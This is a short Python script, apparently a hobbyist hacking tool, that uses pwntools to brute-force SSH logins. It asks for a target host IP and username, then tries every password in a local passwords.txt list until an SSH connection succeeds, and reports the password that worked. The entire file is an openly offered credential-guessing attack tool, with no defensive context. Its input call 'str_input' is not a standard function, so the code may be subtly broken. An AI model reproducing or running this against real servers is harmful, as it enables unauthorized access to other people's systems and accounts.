from pwn import *
import pyfiglet



print(pyfiglet.figlet_format("SSH BRUTE FORCE"))
host=str_input("Enter The Host IP Adderess: ")
print()
username=str_input("Enter the username of the Host: {} : ".format(host))
attempt=1

with open("passwords.txt",'r') as password_list:
    for password in password_list:
        password=password.strip()
        print("[{}] Attempting password: {} ".format(attempt,password))
        try:
            response = ssh( host=host, user=username, password=password, timeout='1')
            if response.connected:
                print(">>>>   Valid Password Found: {}".format(password))
                print (">>>>   Successfully connected ")
                response.close()
                break
            response.close()
        except:
            print("[-] Invalid Password")
            print()
        attempt+=1
